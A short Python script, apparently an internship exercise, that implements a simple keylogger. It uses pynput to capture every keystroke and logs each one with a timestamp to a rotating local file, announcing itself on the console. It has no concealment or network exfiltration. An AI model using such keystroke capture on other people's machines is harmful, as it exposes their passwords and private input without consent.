from pynput import keyboard
import logging
import os
from logging.handlers import RotatingFileHandler

path = r"D:\Prodigy Infotech\Task 4 Simple Keylogger\keylog.txt"

os.makedirs(os.path.dirname(path), exist_ok=True)

log_limit = RotatingFileHandler(path, maxBytes=1_000_000, backupCount=3)

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s: %(message)s', handlers=[log_limit])

def click(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special Key {key} pressed')

def start():
    with keyboard.Listener(on_press=click) as listener:
        print("Simple Keylogger Initiated \nPress CTRL+C to Stop Execution.")
        listener.join()

start()
